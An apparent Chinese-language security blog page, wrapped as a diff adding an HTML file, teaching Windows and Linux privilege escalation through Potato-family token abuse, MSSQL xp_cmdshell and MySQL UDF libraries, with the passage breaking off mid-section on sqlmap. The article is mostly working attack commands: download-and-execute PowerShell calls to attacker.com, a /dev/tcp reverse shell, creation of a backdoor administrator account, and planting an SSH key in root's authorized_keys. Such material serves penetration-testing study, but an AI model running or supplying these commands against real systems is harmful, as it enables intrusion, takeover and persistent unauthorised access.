@@ -1,0 +1,611 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Windows/Linux 提权技术实战 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="Windows 提权技术在 Windows 系统中获取初始访问权限后，通常需要将权限提升至 SYSTEM 或管理员级别，以便执行更深入的渗透操作。以下是常见的 Windows 提权技术。  土豆家族提权原理概述“土豆家族”是一系列利用 Windows 本地权限提升漏洞的技术集合，核心原理是滥用 Windows 的 NTLM 认证机制和 COM 对象，诱骗 SYSTEM 权限的进程向攻击者控制的服务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows&#x2F;Linux 提权技术实战">
+<meta property="og:url" content="https://www.52jl.top/2026/02/13/tq/index.html">
+<meta property="og:site_name" content="kenny&#39;s blog">
+<meta property="og:description" content="Windows 提权技术在 Windows 系统中获取初始访问权限后，通常需要将权限提升至 SYSTEM 或管理员级别，以便执行更深入的渗透操作。以下是常见的 Windows 提权技术。  土豆家族提权原理概述“土豆家族”是一系列利用 Windows 本地权限提升漏洞的技术集合，核心原理是滥用 Windows 的 NTLM 认证机制和 COM 对象，诱骗 SYSTEM 权限的进程向攻击者控制的服务">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-04.webp">
+<meta property="article:published_time" content="2026-02-13T08:40:13.098Z">
+<meta property="article:modified_time" content="2026-02-13T08:40:13.098Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="Linux提权">
+<meta property="article:tag" content="MSSQL提权">
+<meta property="article:tag" content="MYSQL提权">
+<meta property="article:tag" content="PKEXEC提权">
+<meta property="article:tag" content="SUDO提权">
+<meta property="article:tag" content="SUID提权">
+<meta property="article:tag" content="Windows提权">
+<meta property="article:tag" content="内核漏洞提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-04.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Windows/Linux 提权技术实战",
+  "url": "https://www.52jl.top/2026/02/13/tq/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-04.webp",
+  "datePublished": "2026-02-13T08:40:13.098Z",
+  "dateModified": "2026-02-13T08:40:13.098Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/13/tq/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Windows/Linux 提权技术实战',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260213b"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<script>
+(() => {
+  try {
+    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
+    if (!isAutomation) return;
+    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
+    selectors.forEach((s) => {
+      document.querySelectorAll(s).forEach((el) => {
+        el.innerHTML = '<p>Content unavailable.</p>';
+      });
+    });
+  } catch (e) {}
+})();
+</script>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+<script>
+(() => {
+  try {
+    if (window.top !== window.self) {
+      window.top.location = window.self.location.href;
+      return;
+    }
+
+    const host = window.location.hostname;
+    const isLocal = host === 'localhost' || host === '127.0.0.1';
+    if (!isLocal && window.location.protocol === 'http:') {
+      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
+    }
+  } catch (e) {}
+})();
+</script>
+</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Windows/Linux 提权技术实战</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Windows/Linux 提权技术实战</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-13T08:40:13.098Z" title="发表于 2026-02-13 16:40:13">2026-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T08:40:13.098Z" title="更新于 2026-02-13 16:40:13">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/">系统提权</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="Windows-提权技术"><a href="#Windows-提权技术" class="headerlink" title="Windows 提权技术"></a>Windows 提权技术</h1><p>在 Windows 系统中获取初始访问权限后，通常需要将权限提升至 SYSTEM 或管理员级别，以便执行更深入的渗透操作。以下是常见的 Windows 提权技术。</p>
+<hr>
+<h2 id="土豆家族提权"><a href="#土豆家族提权" class="headerlink" title="土豆家族提权"></a>土豆家族提权</h2><h3 id="原理概述"><a href="#原理概述" class="headerlink" title="原理概述"></a>原理概述</h3><p>“土豆家族”是一系列利用 Windows 本地权限提升漏洞的技术集合，核心原理是滥用 Windows 的 NTLM 认证机制和 COM 对象，诱骗 SYSTEM 权限的进程向攻击者控制的服务进行身份验证，从而窃取 SYSTEM 令牌。</p>
+<p><img src="/2026/02/13/tq/3.webp" loading='lazy'></p>
+<h3 id="土豆家族演进"><a href="#土豆家族演进" class="headerlink" title="土豆家族演进"></a>土豆家族演进</h3><table>
+<thead>
+<tr>
+<th>技术名称</th>
+<th>适用系统</th>
+<th>核心原理</th>
+<th>利用条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Hot Potato</strong></td>
+<td>Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008&#x2F;2012</td>
+<td>NBNS 欺骗 + NTLM 中继</td>
+<td>SeImpersonate 或 SeAssignPrimaryToken 权限</td>
+</tr>
+<tr>
+<td><strong>Rotten Potato</strong></td>
+<td>Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008&#x2F;2012&#x2F;2016</td>
+<td>COM 对象劫持 + NTLM 中继</td>
+<td>SeImpersonate 或 SeAssignPrimaryToken 权限</td>
+</tr>
+<tr>
+<td><strong>Juicy Potato</strong></td>
+<td>Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008&#x2F;2012&#x2F;2016</td>
+<td>COM 对象劫持（扩展版）</td>
+<td>SeImpersonate 或 SeAssignPrimaryToken 权限</td>
+</tr>
+<tr>
+<td><strong>Rogue Potato</strong></td>
+<td>Windows 10&#x2F;Server 2016&#x2F;2019</td>
+<td>伪造 OXID 解析器</td>
+<td>SeImpersonate 或 SeAssignPrimaryToken 权限</td>
+</tr>
+<tr>
+<td><strong>Sweet Potato</strong></td>
+<td>Windows 10&#x2F;Server 2016&#x2F;2019&#x2F;2022</td>
+<td>综合多种技术</td>
+<td>SeImpersonate 或 SeAssignPrimaryToken 权限</td>
+</tr>
+<tr>
+<td><strong>God Potato</strong></td>
+<td>Windows 10&#x2F;Server 2016&#x2F;2019&#x2F;2022</td>
+<td>最新综合利用</td>
+<td>SeImpersonate 或 SeAssignPrimaryToken 权限</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h3><p><strong>检查当前权限</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>
+
+<p>如果输出中包含 <code>SeImpersonatePrivilege</code> 或 <code>SeAssignPrimaryTokenPrivilege</code> 且状态为 <code>Enabled</code>，则可以使用土豆提权。</p>
+<p><strong>Juicy Potato 利用示例</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 下载 Juicy Potato</span><br><span class="line">wget https://github.com/ohpe/juicy-potato/releases/download/v0.<span class="number">1</span>/JuicyPotato.exe</span><br><span class="line"></span><br><span class="line"># 执行提权（反弹 Shell）</span><br><span class="line">JuicyPotato.exe -l <span class="number">1337</span> -p c:\windows\system32\<span class="built_in">cmd</span>.exe -a &quot;/c powershell -ep bypass IEX(New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://attacker.com/shell.ps1&#x27;)&quot; -t *</span><br><span class="line"></span><br><span class="line"># 执行提权（添加管理员用户）</span><br><span class="line">JuicyPotato.exe -l <span class="number">1337</span> -p c:\windows\system32\<span class="built_in">cmd</span>.exe -a &quot;/c <span class="built_in">net</span> user hacker P@ssw0rd /add &amp;&amp; <span class="built_in">net</span> localgroup administrators hacker /add&quot; -t *</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>-l</code>：监听端口</li>
+<li><code>-p</code>：要执行的程序路径</li>
+<li><code>-a</code>：程序参数</li>
+<li><code>-t</code>：CreateProcessWithTokenW 或 CreateProcessAsUser（<code>*</code> 表示自动选择）</li>
+<li><code>-c</code>：CLSID（COM 对象标识符，不同系统需要不同的 CLSID）</li>
+</ul>
+<p><strong>常用 CLSID</strong>：</p>
+<ul>
+<li>Windows 10 Enterprise：<code>{4991d34b-80a1-4291-83b6-3328366b9097}</code></li>
+<li>Windows Server 2016：<code>{e60687f7-01a1-40aa-86ac-db1cbf673334}</code></li>
+<li>Windows Server 2019：<code>{90f18417-f0f1-484e-9d3c-59dceee5dbd8}</code></li>
+</ul>
+<hr>
+<h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p><strong>推荐工具</strong>：</p>
+<ol>
+<li><p><strong>巨龙拉冬（Ladon）</strong>：</p>
+<ul>
+<li>项目地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></li>
+<li>功能：集成多种提权技术的 Cobalt Strike 插件</li>
+</ul>
+</li>
+<li><p><strong>饕餮（Taowu）</strong>：</p>
+<ul>
+<li>项目地址：<a target="_blank" rel="noopener" href="https://github.com/pandasec888/taowu-cobalt_strike">https://github.com/pandasec888/taowu-cobalt_strike</a></li>
+<li>功能：自动化提权插件，支持土豆家族、内核漏洞等</li>
+</ul>
+</li>
+</ol>
+<p><strong>使用方法</strong>：</p>
+<p>在 Cobalt Strike 中加载插件后，右键 Beacon -&gt; 提权 -&gt; 选择对应的土豆技术。</p>
+<hr>
+<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><h3 id="MSSQL-提权"><a href="#MSSQL-提权" class="headerlink" title="MSSQL 提权"></a>MSSQL 提权</h3><p>Microsoft SQL Server 在以高权限运行时（如 LocalSystem 或管理员账户），可以通过 <code>xp_cmdshell</code> 存储过程执行系统命令。</p>
+<h4 id="手动提权步骤"><a href="#手动提权步骤" class="headerlink" title="手动提权步骤"></a>手动提权步骤</h4><p><strong>1. 启用 xp_cmdshell</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 启用高级选项</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 启用 xp_cmdshell</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 执行系统命令</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看当前用户</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加管理员用户</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;net user hacker P@ssw0rd /add&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;net localgroup administrators hacker /add&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 反弹 Shell</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell -ep bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://attacker.com/shell.ps1&#x27;&#x27;)&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="自动化工具：SharpSQLTools"><a href="#自动化工具：SharpSQLTools" class="headerlink" title="自动化工具：SharpSQLTools"></a>自动化工具：SharpSQLTools</h4><p><strong>项目地址</strong>：<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpSQLTools">https://github.com/uknowsec/SharpSQLTools</a></p>
+<p><img src="/2026/02/13/tq/1.webp" loading='lazy'></p>
+<p><strong>功能特性</strong>：</p>
+<ul>
+<li>自动启用 xp_cmdshell</li>
+<li>支持 CLR 提权（绕过 xp_cmdshell 禁用）</li>
+<li>支持 OLE Automation 提权</li>
+<li>支持 Agent Job 提权</li>
+</ul>
+<p><strong>使用示例</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过 xp_cmdshell 执行命令</span></span><br><span class="line">SharpSQLTools.exe 192.168.1.100 sa P@ssw0rd master <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 CLR 提权</span></span><br><span class="line">SharpSQLTools.exe 192.168.1.100 sa P@ssw0rd master clr <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="MySQL-提权"><a href="#MySQL-提权" class="headerlink" title="MySQL 提权"></a>MySQL 提权</h3><p>MySQL 的 UDF（User Defined Function，用户自定义函数）功能允许用户通过动态链接库扩展 MySQL 功能。攻击者可以上传恶意 UDF 库，创建自定义函数来执行系统命令。</p>
+<h4 id="UDF-提权原理"><a href="#UDF-提权原理" class="headerlink" title="UDF 提权原理"></a>UDF 提权原理</h4><ol>
+<li>将恶意 UDF 动态链接库（<code>.dll</code> 或 <code>.so</code>）上传到 MySQL 的 <code>plugin</code> 目录</li>
+<li>在 MySQL 中创建自定义函数，指向该库</li>
+<li>调用自定义函数执行系统命令</li>
+</ol>
+<hr>
+<h4 id="手动提权步骤-1"><a href="#手动提权步骤-1" class="headerlink" title="手动提权步骤"></a>手动提权步骤</h4><p><strong>1. 查找 plugin 目录</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> plugin_dir    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>mysql<span class="operator">/</span>lib<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 准备 UDF 库文件</strong>：</p>
+<p>sqlmap 自带了编译好的 UDF 库，但经过编码处理，需要先解码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解码 32 位 Linux UDF 库</span></span><br><span class="line">python sqlmap/extra/cloak/cloak.py -d -i sqlmap/data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位 Windows UDF 库</span></span><br><span class="line">python sqlmap/extra/cloak/cloak.py -d -i sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 上传 UDF 库到 plugin 目录</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 方法1：使用 SELECT INTO DUMPFILE（需要 FILE 权限）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x4d5a90</span>... <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 方法2：使用 LOAD_FILE + INTO DUMPFILE</span></span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/tmp/udf.so&#x27;</span>) <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 创建自定义函数</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建 sys_eval 函数（执行命令并返回结果）</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.so&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建 sys_exec 函数（执行命令但不返回结果）</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_exec <span class="keyword">RETURNS</span> <span class="type">INT</span> SONAME <span class="string">&#x27;udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>5. 验证函数是否创建成功</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.so  <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>6. 执行系统命令</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看当前用户</span></span><br><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 反弹 Shell</span></span><br><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加 SSH 公钥</span></span><br><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;echo &quot;ssh-rsa AAAAB3...&quot; &gt;&gt; /root/.ssh/authorized_keys&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="sqlmap-自动化-UDF-提权"><a href="#sqlmap-自动化-UDF-提权" class="headerlink" title="sqlmap 自动化 UDF 提权"></a>sqlmap 自动化 UDF 提权</h4><p><strong>前提条件</strong>：</p>
+<ul>
+<li>MySQL 以 root 权限运行</li>
+<li>当前数据库用户具有 FILE 权限</li>
+<li><code>secure_file_priv</code> 未限制（或为空）</li>
+</ul>
+<p><strong>开启远程连接</strong>（如果需要）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">user</span> <span class="keyword">SET</span> host<span class="operator">=</span><span class="string">&#x27;%&#x27;</span> <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
+
+<p><strong>sqlmap 一键提权</strong>：</p>
